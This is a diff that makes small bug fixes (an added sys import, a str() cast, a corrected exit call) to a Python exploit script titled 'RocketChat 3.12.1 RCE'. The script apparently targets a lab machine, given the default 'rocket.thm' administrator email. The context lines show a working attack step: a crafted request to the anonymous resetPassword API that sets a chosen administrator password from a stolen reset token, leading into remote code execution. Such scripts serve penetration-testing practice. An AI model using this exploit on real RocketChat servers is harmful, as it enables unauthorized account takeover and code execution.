@@ -65,6 +65,7 @@ import time
 import hashlib
 import json
 import argparse
+import sys
 
 parser = argparse.ArgumentParser(description='RocketChat 3.12.1 RCE')
 parser.add_argument('-a', help='Administrator email', default='admin@rocket.thm')
@@ -104,7 +105,7 @@ def resettoken(url):
 	return token
 
 def changingpassword(url,token):
-	payload = '{"message":"{\\"msg\\":\\"method\\",\\"method\\":\\"resetPassword\\",\\"params\\":[\\"'+token+'\\",\\"'+passToSet+'\\"]}"}'
+	payload = '{"message":"{\\"msg\\":\\"method\\",\\"method\\":\\"resetPassword\\",\\"params\\":[\\"'+token+'\\",\\"'+str(passToSet)+'\\"]}"}'
 	headers={'content-type': 'application/json'}
 	r = requests.post(url+"/api/v1/method.callAnon/resetPassword", data = payload, headers = headers, verify = False, allow_redirects = False)
 	if "error" in r.text:
@@ -162,7 +163,7 @@ if authRes == False:
 	authRes = auth(target)
 	if authRes == False:
 		print("[-] failed to auth")
-		exit
+		sys.exit()
 
 ## Authenticating and triggering rce
 
